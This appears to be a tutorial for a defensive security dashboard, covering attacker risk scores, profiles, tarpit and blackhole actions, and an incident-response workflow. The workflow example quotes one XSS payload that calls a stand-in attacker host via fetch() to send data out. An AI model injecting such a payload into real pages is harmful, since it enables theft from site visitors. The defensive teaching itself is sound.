# Tutorial: Attacker Fingerprinting – Real-Time Threat Monitoring & Response

> Monitor, classify, and contain active attackers in real-time. Track threat sources, profile their behavior, and respond to attacks as they happen.

---

## What You'll Learn

- ✅ Open and navigate the Attacker Fingerprinting console
- ✅ Understand attacker classification (risk scores, categories)
- ✅ Interpret attacker profiles and behavior patterns
- ✅ Use filtering and search to find specific threats
- ✅ Take action: trap in tarpit, blackhole, or release attackers
- ✅ Monitor protocol-level attack behavior (heatmaps)
- ✅ Respond to security incidents quickly
- ✅ Build attacker intelligence from collected data

## Prerequisites

- **Apparatus running** — Server accessible at `http://localhost:8090`
- **Web dashboard open** — Navigate to http://localhost:8090/dashboard
- **Active traffic** — Some attack traffic hitting the system (real or simulated)
- **Security awareness** — Basic understanding of attack types, IP reputation, incident response

## Time Estimate

~25 minutes (walkthrough + hands-on response scenarios)

## What You'll Build

By the end, you'll be able to:
1. **Monitor active threats** in real-time
2. **Classify attackers** by risk level and behavior
3. **Investigate attack sources** and their activity patterns
4. **Take containment actions** (tarpit, blackhole)
5. **Respond to incidents** as they develop
6. **Build threat intelligence** from attacker profiles

---

## Section 1: Opening the Attacker Fingerprinting Console

### What is Attacker Fingerprinting?

The **Attacker Fingerprinting Console** is a **real-time threat monitoring dashboard** that tracks every IP address interacting with your system. It provides:
- 📍 **Attacker catalog** — All unique IP addresses detected
- ⚠️ **Risk scores** — Threat level assessment (0–100)
- 🌍 **Categorization** — Internal, Known Bot, Unknown External
- 📊 **Protocol heatmap** — Which attack vectors each attacker used
- ⏰ **Timeline** — When each attacker was last seen
- 🎯 **Action history** — Contained, released, tarpitted
- 🔧 **Response actions** — Block, trap, release, investigate

Think of it as your **SOC (Security Operations Center) dashboard** — a central console for tracking and responding to threats.

### Try It: Navigate to Attacker Fingerprinting

1. Open the dashboard: `http://localhost:8090/dashboard`
2. Click **Attacker Fingerprinting** in the left sidebar (or press Cmd+K and type "Fingerprint")
3. You should see:
   - **Attacker list** on the left (IPs, risk scores, statuses)
   - **Attacker profile panel** in the center/right
   - **Search and filter controls** at the top
   - **Action buttons** for response actions

### The Attacker Fingerprinting Layout

```
┌─ Attacker Fingerprinting Console ──────────────────┐
│                                                     │
│ Search: [______] Filter: [Risk ↓] [Category ↓]    │
│                                                     │
│ Attackers List:                  Attacker Profile: │
│ ┌──────────────────────┐        ┌────────────────┐│
│ │ IP Address │ Risk    │        │ IP: 192.168.1.││
│ │ 192.168.1.1│ 🔴 85   │        │ Risk: 85/100   ││
│ │ 10.0.0.50  │ 🟡 42   │   --→  │ Category: EXT  ││
│ │ 172.16.0.1 │ 🟢 12   │        │ Last Seen: 2min││
│ │ ...        │ ...     │        │                ││
│ └──────────────────────┘        │ Protocols Used:││
│                                  │ HTTP: 95 req   ││
│                                  │ DNS: 12 req    ││
│                                  │ TCP: 8 conn    ││
│                                  │                ││
│                                  │ Actions:       ││
│                                  │ [Tarpit]       ││
│                                  │ [Blackhole]    ││
│                                  │ [Release]      ││
│                                  │ [Details...]   ││
│                                  └────────────────┘│
│                                                     │
└─────────────────────────────────────────────────────┘
```

### Checkpoint

- [ ] Attacker Fingerprinting console visible
- [ ] Attacker list populated (shows IP addresses and risk scores)
- [ ] Can see attacker profile panel
- [ ] Search/filter controls accessible

**Troubleshooting:**

**Console shows "No attackers" but you're expecting activity?**
→ Generate some attack traffic first:
  - Run an Autopilot campaign: [Tutorial: Autopilot](tutorial-autopilot.md)
  - Or: Use Live Payload Fuzzer to send payloads: [Tutorial: Live Payload Fuzzer](tutorial-live-payload-fuzzer.md)
  - Once requests hit, they'll appear here

**IP list not updating in real-time?**
→ Refresh the page (F5)
→ Or: Make sure Apparatus is receiving traffic

---

## Section 2: Understanding Attacker Risk Scores

### What is a Risk Score?

A **risk score** (0–100) represents the **threat level** of an IP address. It's calculated based on:

| Factor | Impact | Example |
|--------|--------|---------|
| **Attack frequency** | Higher for frequent attempts | 10 requests/sec = higher score |
| **Attack success rate** | Higher if some requests pass through | Bypassed WAF = higher score |
| **Payload types** | Critical/high-severity payloads increase score | RCE attempts = higher score |
| **IP reputation** | Known malicious IPs get bonus | Botnet list = higher score |
| **Tarpit effectiveness** | Longer time in tarpit = lower skill = lower score | Gave up quickly = lower score |
| **Geographic factors** | Unexpected regions get higher score | Rare country = higher score |

### Risk Score Color Coding

```
🔴 CRITICAL (75–100)    = Immediate threat, likely hostile
🟠 HIGH (50–74)         = Significant risk, warrant investigation
🟡 MEDIUM (25–49)       = Notable activity, monitor closely
🟢 LOW (10–24)          = Minor anomaly, likely benign
⚪ MINIMAL (0–9)        = Normal user, minimal risk
```

### Try It: Identify High-Risk Attackers

**Goal:** Find and examine the highest-risk IPs.

**Steps:**

1. Look at the **Attackers List** on the left
2. Sort by **Risk Score** (highest first)
3. Identify IPs with:
   - 🔴 **75+** = Critical threats (investigate immediately)
   - 🟠 **50–74** = High threats (investigate soon)

4. Click on a high-risk IP to view its **Profile**

### Understanding Attacker Categories

Each IP is classified into a category:

| Category | Meaning | Action |
|----------|---------|--------|
| **Internal** | IP from your network (10.0.0.0/8, 192.168.0.0/16, etc.) | Monitor for insider threats, compromised endpoints |
| **Known Bot** | IP on a known botnet/spider list | Track (may be suspicious, may be legitimate bot) |
| **Unknown External** | IP from outside your network, no reputation data | Investigate (could be attacker or legitimate user) |

### Try It: Filter by Category

**Goal:** Find all external attackers.

**Steps:**

1. Click the **Category** filter dropdown
2. Select **"Unknown External"**
3. View only external IPs
4. Identify which ones have high risk scores

### Checkpoint

- [ ] Understand risk score meaning (0–100 scale)
- [ ] Know color coding (🔴 critical, 🟠 high, etc.)
- [ ] Can identify high-risk attackers
- [ ] Understand attacker categories
- [ ] Can filter by category

---

## Section 3: Analyzing Attacker Profiles

### What's in an Attacker Profile?

When you click on an IP in the Attackers List, you see a detailed **profile** showing:

```
┌─ Attacker Profile ──────────────────────────────┐
│                                                  │
│ IP Address: 192.168.1.50                        │
│ Risk Score: 85/100 🔴 CRITICAL                 │
│ Category: Unknown External                      │
│ First Seen: 2026-02-22 14:30:15                │
│ Last Seen: 2026-02-22 14:47:33 (2 min ago)    │
│ Total Requests: 1,247                          │
│ Requests Blocked: 1,208 (96.9%)                │
│ Success Rate: 3.1%                             │
│                                                  │
│ Protocol Heatmap:                               │
│ ┌─────────────────────────────────────────────┐│
│ │ HTTP    ████████████████░░░  95%  1100 reqs││
│ │ HTTPS   ██████░░░░░░░░░░░░░░  12%   140 reqs││
│ │ TCP     ██░░░░░░░░░░░░░░░░░░   2%    20 reqs││
│ │ DNS     █░░░░░░░░░░░░░░░░░░░   1%     7 reqs││
│ └─────────────────────────────────────────────┘│
│                                                  │
│ Attack Types Detected:                          │
│ ✓ XSS attempts: 412                            │
│ ✓ SQLi attempts: 380                           │
│ ✓ Path Traversal: 198                          │
│ ✓ Command Injection: 165                       │
│ ✓ Other: 92                                    │
│                                                  │
│ Actions Taken:                                  │
│ - Tarpit (slowed responses): 47s cumulative    │
│ - Blocked requests: 1,208                      │
│ - Last action: Tarpit (5 min ago)             │
│                                                  │
│ [Tarpit] [Blackhole] [Release] [Details...]    │
│                                                  │
└──────────────────────────────────────────────────┘
```

### Interpreting the Heatmap

The **protocol heatmap** shows which attack vectors the attacker used:

```
High HTTP activity (95%) with some HTTPS (12%):
→ Attacker primarily targeting HTTP endpoints
→ Also testing HTTPS/TLS encryption bypass

Low TCP/DNS activity (2%, 1%):
→ Focused on application-layer attacks
→ Not testing network-layer attacks
→ Likely automated tool (not sophisticated)

Interpretation: Script kiddie using automated scanner
Likely threat: Low (automated tool, not targeted)
```

### Try It: Analyze a High-Risk Attacker

**Goal:** Profile a critical attacker and understand their attack pattern.

**Steps:**

1. Click on an attacker with **🔴 risk score > 75**
2. Review the profile:
   - **Success Rate:** How many requests got through?
   - **Protocol Heatmap:** What attack vectors did they use?
   - **Attack Types:** What specific payloads did they try?
3. Ask yourself:
   - Is this automated tool or skilled attacker?
   - What are they targeting?
   - How successful are they?

### Checkpoint

- [ ] Can read and interpret attacker profiles
- [ ] Understand protocol heatmaps
- [ ] Know what attack types indicate (threat capability)
- [ ] Can distinguish automated vs. targeted attacks

---

## Section 4: Taking Response Actions

### Available Actions

For each attacker, you can take immediate actions:

| Action | Effect | Use When |
|--------|--------|----------|
| **Tarpit** | Slow down their requests (delays response) | Active attack, want to wear them out |
| **Blackhole** | Drop all packets silently (block) | Confirmed hostile, want immediate block |
| **Release** | Stop all restrictions, allow requests | False positive, legitimate user |
| **Details** | View full attack log and timeline | Need forensics, investigation |
| **Whitelist** | Add to safe list (never block) | Trusted source, friendly tool |
| **Escalate** | Forward to incident response team | Critical threat, need human intervention |

### Tarpit: The Middle Ground

**Tarpit** is a defensive strategy that:
- ✅ Keeps the connection open
- ⏱️ Delays responses (by 1–30 seconds per request)
- 💪 Exhausts attacker resources (bandwidth, patience, processing)
- 📊 Collects more forensic data

**Why tarpit instead of block?**
- Attacker keeps trying, wastes their resources
- You gather more intelligence about their tools/tactics
- Less obvious than blocking (attacker may not notice)
- Can gradually increase delay over time

### Try It: Tarpit an Active Attacker

**Goal:** Slow down a hostile IP to wear out their attack tool.

**Steps:**

1. Find an attacker with **🔴 high risk score (75+)**
2. Click the **[Tarpit]** button
3. System shows confirmation:
   ```
   ✅ Tarpit active
   Current delay: 5 seconds per request
   ```
4. Observe the effect:
   - Attacker's requests get slower
   - Eventually they may give up and move to next target
   - You keep collecting data on their attack patterns

### Try It: Blackhole a Confirmed Threat

**Goal:** Immediately block a dangerous attacker.

**Steps:**

1. Find an attacker with:
   - **🔴 high risk score**
   - **100% blocked rate** (all attempts were malicious)
   - **Known malicious payload** (RCE, data exfiltration, etc.)
2. Click **[Blackhole]** button
3. System shows:
   ```
   ✅ Blackhole active
   All requests from 192.168.1.50 are dropped
   Requests dropped: 47
   ```

### Checkpoint

- [ ] Understand when to use tarpit vs. blackhole
- [ ] Can execute response actions
- [ ] Know the effects of each action
- [ ] Can document actions taken

**Ethical Considerations:**

⚠️ **Important:** Only take these actions on:
- ✅ Your own systems (you have authority)
- ✅ Authorized penetration testing (with written approval)
- ✅ Lab/sandbox environments
- ✅ With proper logging for audit trail

❌ **Never:**
- Block IPs on systems you don't own
- Attack external systems without authorization
- Hide your actions or delete logs

---

## Section 5: Incident Response Workflow

### Scenario: Active Attack Response

**You notice a sudden spike of requests. What do you do?**

#### Step 1: Identify the Threat (1 min)

```
Task: Find the attacker causing the spike
Action:
  1. Open Attacker Fingerprinting console
  2. Sort by "Requests in Last 5 Min"
  3. Find IP with highest count

Result:
  IP: 203.0.113.45
  Risk: 92 🔴 CRITICAL
  Requests (last 5 min): 847
  Blocked: 843 (99.5%)
```

#### Step 2: Profile the Attacker (1–2 min)

```
Task: Understand the attack
Action:
  1. Click on the IP to open profile
  2. Review protocol heatmap
  3. Check attack types
  4. Look at success rate

Finding:
  Protocol: 100% HTTP
  Attack Types: 800 XSS, 47 SQLi
  Success Rate: 0.5% (4 requests got through!)
  Pattern: Automated XSS scanner
  Risk: High (bypassed WAF on 4 requests)
```

#### Step 3: Take Immediate Action (1 min)

```
Decision Tree:
  Is success rate > 0?
    YES ─→ Blackhole immediately (attacker bypassed WAF)
    NO  ─→ Tarpit (collect more data, warn attacker)

Action: Blackhole 203.0.113.45
```

#### Step 4: Investigate the Bypass (2–5 min)

```
Task: Find out how they bypassed the WAF
Action:
  1. Click [Details] on the attacker profile
  2. View the 4 successful requests
  3. Review the payloads
  4. Check if it's a known vulnerability

Finding:
  Payload: "<img src=x onerror=\"fetch('https://attacker.com/...)\""
  Issue: WAF didn't decode the \x escape sequences
  Severity: HIGH
  Next: Update WAF rule to decode escapes
```

#### Step 5: Document & Escalate (2 min)

```
Incident Report:
  Time: 2026-02-22 14:45:00
  Attacker: 203.0.113.45 (Unknown External)
  Attack Type: XSS scanner (automated)
  Requests: 847 in 5 minutes
  Blocked: 843, Bypassed: 4
  Action Taken: Blackhole
  Issue Found: WAF bypass via escape sequences
  Recommended Fix: Update WAF XSS rule
  Status: CONTAINED, INVESTIGATING
```

### Try It: Simulate an Incident Response

**Goal:** Practice the full incident response workflow.

**Prerequisites:** Have an attacker with activity in your system.

**Workflow:**

1. **Identify** — Find the highest-risk IP in the last 5 minutes
2. **Profile** — Open its profile and review attack types
3. **Assess** — Determine if it's automated or targeted
4. **Act** — Take appropriate action (tarpit or blackhole)
5. **Document** — Create a summary of the incident

**Expected time:** 5–10 minutes

### Checkpoint

- [ ] Understand the incident response workflow
- [ ] Can quickly identify threats
- [ ] Can profile attackers
- [ ] Can make response decisions
- [ ] Can document findings

---

## Section 6: Threat Intelligence & Trend Analysis

### Building Attacker Intelligence Over Time

As your system collects data, you build **threat intelligence**:

| Intelligence | Use For | Example |
|--------------|---------|---------|
| **Top attackers** | Blocking persistent threats | IPs that return weekly |
| **Common payloads** | Updating WAF rules | Most-blocked payload types |
| **Attack patterns** | Predicting future attacks | Attacks always from certain regions |
| **Tool signatures** | Identifying attacker tools | Specific User-Agent strings |
| **Time patterns** | Predicting attack timing | Attacks always at 3 AM UTC |

### Try It: Find Attack Patterns

**Goal:** Identify trends in attacker behavior.

**Steps:**

1. Review the **Attackers List** over time:
   - Which IPs return repeatedly?
   - Which ones have the highest success rates?

2. Analyze **protocol heatmaps** for patterns:
   - Do certain IPs favor HTTP over HTTPS?
   - Do they try DNS tunneling?

3. Study **attack types** distribution:
   - What's the most common payload?
   - Do specific IPs focus on certain attack vectors?

4. Look for **geographic clustering**:
   - Are attackers coming from the same region?
   - Any obvious patterns (same ISP, similar netblocks)?

### Try It: Create a Threat Intelligence Summary

**Format:**

```markdown
# Weekly Threat Intelligence Report
Date Range: 2026-02-15 to 2026-02-22

## Top Attackers (by requests)
1. 203.0.113.45 - 15,420 requests (Automated XSS scanner)
2. 198.51.100.12 - 8,950 requests (SQLi attempts)
3. 192.0.2.87 - 5,432 requests (Path traversal scanner)

## Common Attack Vectors
1. XSS: 18,420 attempts (67%)
2. SQLi: 7,390 attempts (27%)
3. Path Traversal: 1,820 attempts (6%)

## Success Rate
- Total requests: 27,640
- Blocked: 27,105 (98.1%)
- Bypassed: 535 (1.9%)

## Key Findings
- Increase in automated scanner activity
- 4 XSS bypasses (escape sequence issue)
- 1 SQLi bypass (comment handling)
- No successful exploitation

## Recommendations
1. Update XSS WAF rule for escape sequences
2. Update SQLi rule for comments
3. Monitor top 3 attackers
4. Consider IP-level rate limiting
```

---

## Section 7: Advanced Monitoring & Alerting

### Setting Up Alerts

**Key metrics to monitor:**

| Metric | Alert Threshold | Action |
|--------|-----------------|--------|
| **New attacker appears** | Any new IP | Log and investigate |
| **Risk score jumps** | <50 to >75 | Immediate review |
| **Bypass detected** | Any successful attack | Incident response |
| **Attack rate spike** | >100 req/sec from one IP | Automatic blackhole |
| **Protocol anomaly** | Unusual protocol mix | Investigate tool |

### Try It: Monitor in Real-Time

**Goal:** Watch for new threats as they arrive.

**Steps:**

1. Keep the Attacker Fingerprinting console open
2. Trigger some attack traffic (use Autopilot or Live Payload Fuzzer)
3. Watch as:
   - New IPs appear in the list
   - Risk scores increase in real-time
   - Actions are logged
   - Heatmaps update

### Checkpoint

- [ ] Understand what to monitor
- [ ] Know alert thresholds
- [ ] Can set up real-time monitoring
- [ ] Can react to new threats quickly

---

## Section 8: Best Practices

### ✅ DO: Document All Actions

```
When you tarpit or blackhole:
- Record timestamp
- Note reason (what triggered the action)
- Document findings (attack types, success rate)
- Keep for audit trail
```

### ✅ DO: Review False Positives

```
If you blackhole an IP:
- Monitor for complaints (legitimate users)
- Review false positive rate
- Adjust thresholds if needed
- Maintain a whitelist of known-good IPs
```

### ✅ DO: Correlate with Other Systems

```
Cross-reference Attacker Fingerprinting with:
- Firewall logs
- IDS/IPS alerts
- Web server logs
- Endpoint detection tools
```

### ❌ DON'T: Overreact to Low-Risk IPs

```
❌ WRONG:
Blackhole everything with risk > 50

✅ RIGHT:
Tarpit first, investigate, then escalate to blackhole
```

### ❌ DON'T: Forget to Review Actions

```
❌ WRONG:
Take action and forget about it

✅ RIGHT:
Periodically review:
- Are tarpitted attackers still attacking?
- Have blackholed IPs tried other attacks?
- Did our actions have the desired effect?
```

---

## Summary

You've learned how to:
- ✅ Open and navigate the Attacker Fingerprinting console
- ✅ Understand risk scores and attacker categories
- ✅ Analyze attacker profiles and behavior patterns
- ✅ Take response actions (tarpit, blackhole, release)
- ✅ Respond to active attacks quickly
- ✅ Build threat intelligence from collected data
- ✅ Monitor threats in real-time

## Next Steps

- **Monitor overall system health:** [Tutorial: Monitoring](tutorial-monitoring.md)
- **Set up defense rules:** [Tutorial: Defense Rules](tutorial-defense-rules.md)
- **Launch campaigns:** [Tutorial: Autopilot](tutorial-autopilot.md)
- **Test payloads manually:** [Tutorial: Live Payload Fuzzer](tutorial-live-payload-fuzzer.md)

---

## Reference: Quick Action Guide

### When to Tarpit
```
✓ Active attack ongoing
✓ Multiple attack vectors detected
✓ Want to gather more intelligence
✓ Want to frustrate attacker without blocking
```

### When to Blackhole
```
✓ Confirmed malicious activity
✓ 100% attack success rate (all requests malicious)
✓ Critical payload attempted (RCE, data ex fil)
✓ Multiple failed tarpits (attacker persistent)
✓ IP on known threat list
```

### When to Release
```
✓ False positive confirmed
✓ Legitimate user wrongly blocked
✓ IP reputation improved
✓ Risk score dropped significantly
```

---

**Last Updated:** 2026-02-22

For real-time collaboration during incidents, see [Tutorial: Webhooks](tutorial-webhooks.md) for alerting integrations.
